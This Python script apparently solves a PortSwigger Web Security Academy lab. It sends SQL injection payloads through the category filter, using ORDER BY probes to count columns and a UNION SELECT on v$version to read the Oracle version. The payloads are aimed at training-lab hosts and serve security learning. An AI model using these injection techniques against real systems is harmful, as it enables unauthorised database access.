import requests
import argparse

parser = argparse.ArgumentParser(description='Solves the following Lab: SQL injection attack, querying the database type and version on Oracle')
parser.add_argument('--id', action='store', help='lab ID, ex: 0a6e00ec03ca2e848083672100ee00fb', required=True)
lab = parser.parse_args()

COLUMNS = 0

for i in range(27, 0, -1):
    r = requests.get("https://" + lab.id + f".web-security-academy.net/filter?category='ORDER BY {i}--")
    print(f"Checking if table has {i} columns.")
    if not "Internal Server Error" in r.text:
        print(f"The database has {i} columns.")
        COLUMNS = i
        break

r = requests.get("https://" + lab.id + f".web-security-academy.net/filter?category='UNION SELECT {'NULL,'*(COLUMNS-1)}banner FROM v$version--")


if not "Internal Server Error" in r.text:
    print(r.text)
else:
    print("Error")


try:
    assert('<p>Solved</p>' in requests.get("https://" + lab.id + ".web-security-academy.net/").text)
    print('Lab solved.')
except Exception:
    print("Error while trying to solve the lab.") 
